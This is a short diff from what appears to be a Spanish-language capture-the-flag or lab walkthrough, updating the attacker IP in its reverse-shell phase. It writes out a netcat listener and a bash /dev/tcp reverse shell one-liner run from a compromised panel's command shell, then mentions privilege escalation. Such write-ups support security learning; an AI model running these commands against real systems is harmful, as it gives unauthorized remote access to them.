@@ -52,11 +52,11 @@ cat user.txt # Flag user obtenida <br>
 
 ### FASE 5: SHELL REVERSA
 Preparación listener: <br>
-ifconfig                    # IP local: 192.168.0.11 <br>
+ifconfig                    # IP local: 192.168.131.128 <br>
 nc -lvp 443                # Listener puerto 443 <br>
 
 Ejecución desde Command Shell del panel: <br>
-bash -i >& /dev/tcp/192.168.0.11/443 0>&1 <br>
+bash -i >& /dev/tcp/192.168.131.128/443 0>&1 <br>
 Shell reversa establecida como usuario cyber <br>
  <br>
 ### FASE 6: ESCALADA DE PRIVILEGIOS
